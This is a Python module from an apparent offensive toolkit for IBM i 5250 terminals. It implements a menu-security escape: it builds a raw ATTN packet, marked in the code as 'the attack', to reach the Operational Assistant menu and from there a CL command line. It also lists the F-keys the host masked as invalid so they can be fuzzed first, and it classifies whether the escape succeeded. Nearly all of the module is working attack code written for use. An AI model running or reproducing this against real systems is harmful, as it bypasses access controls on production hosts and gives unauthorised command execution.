"""
ATTN-key menu escape and SOH PF-mask analysis.

The Silent Signal technique (blog.silentsignal.eu/2022/09/05): pressing
ATTN interrupts the current program and displays the Operational Assistant
menu. From there, F9 brings up a CL command line — bypassing menu-based
security entirely. This works unless the user profile's ATNPGM has been
explicitly overridden (which most shops don't do).

This module provides the building blocks; the GUI/MCP layer drives the
sequence (ATTN → wait → check screen → F9 → wait → check for ===> prompt).

SOH PF-mask analysis: the SOH order in Write-to-Display includes a 24-bit
mask of which F-keys the host considers valid. Keys NOT in the mask are
the interesting ones — they may have handlers the menu doesn't advertise.
TN5250.mutate(unprotect=True) already rewrites the mask to all-enabled;
this module just reports which keys were originally masked.
"""
from typing import Literal
from hackterm_core import Screen
from hack5250.constants import HDR_LEN, HDR_FLAG_ATN, OPCODE_NONE, IAC_EOR


def build_attn_packet() -> bytes:
    """Build an ATTN inbound packet.

    ATTN is signaled via a header flag bit, not an AID byte.
    The body is empty — just header + IAC EOR.

    Header layout (verified against real emulator capture 2026-04-08):
      0-1: rec_len (excludes IAC EOR)
      2-3: GDS type 12A0
      4-5: reserved (TWO bytes)
      6:   var_hdr_len (04)
      7-8: flags (16-bit) — ATN bit goes here
      9:   opcode
    """
    rec_len = HDR_LEN  # no body; IAC EOR not counted
    hdr = bytearray(HDR_LEN)
    hdr[0] = (rec_len >> 8) & 0xFF
    hdr[1] = rec_len & 0xFF
    hdr[2] = 0x12
    hdr[3] = 0xA0
    # hdr[4], hdr[5] = reserved
    hdr[6] = 0x04           # var_hdr_len
    hdr[7] = HDR_FLAG_ATN   # ← the attack — high byte of 16-bit flags
    # hdr[8] = flags lo (0)
    hdr[9] = OPCODE_NONE
    return bytes(hdr) + IAC_EOR


def get_masked_keys(screen: Screen) -> list[str]:
    """Which F-keys did the host say were INVALID?

    These are the keys to fuzz first — if a handler exists for a key
    the host claims is invalid, the developer forgot to remove it.

    pf_mask is 24-bit, bit N (from MSB, 0-indexed) = F(N+1).
    """
    pf_mask = getattr(screen, 'pf_mask', None)
    if pf_mask is None or pf_mask == 0xFFFFFF:
        return []
    masked = []
    for i in range(24):
        bit = 1 << (23 - i)
        if not (pf_mask & bit):
            masked.append(f"F{i + 1}")
    return masked


AttnResult = Literal["OPER_ASSIST", "SYS_REQUEST", "CMDLINE", "BLOCKED"]


def classify_attn_response(screen: Screen) -> AttnResult:
    """Categorize what came back after sending ATTN.

    OPER_ASSIST: Operational Assistant menu — F9 should give command line.
    SYS_REQUEST: System Request menu — different escape path, also useful.
    CMDLINE:     ===> already present — F9 already worked or wasn't needed.
    BLOCKED:     ATNPGM is overridden, ATTN handler intercepted us.
    """
    text = screen.text
    if "===>" in text:
        return "CMDLINE"
    if "Operational Assistant" in text:
        return "OPER_ASSIST"
    if "System Request" in text:
        return "SYS_REQUEST"
    return "BLOCKED"
